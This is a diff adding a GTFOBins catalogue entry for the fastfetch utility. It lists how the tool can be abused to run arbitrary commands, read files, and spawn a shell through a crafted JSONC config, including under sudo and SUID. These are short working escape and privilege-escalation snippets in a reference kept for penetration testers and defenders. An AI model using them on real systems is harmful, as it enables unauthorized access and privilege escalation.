@@ -1,0 +1,32 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/fastfetch -->
+---
+functions:
+  command:
+  - code: |-
+      echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
+      fastfetch -c /path/to/temp-file.jsonc
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  file-read:
+  - binary: false
+    code: |-
+      fastfetch --file /path/to/input-file
+    comment: |-
+      The file content is used as the logo while some other information is displayed on its right.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
+      fastfetch -c /path/to/temp-file.jsonc
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
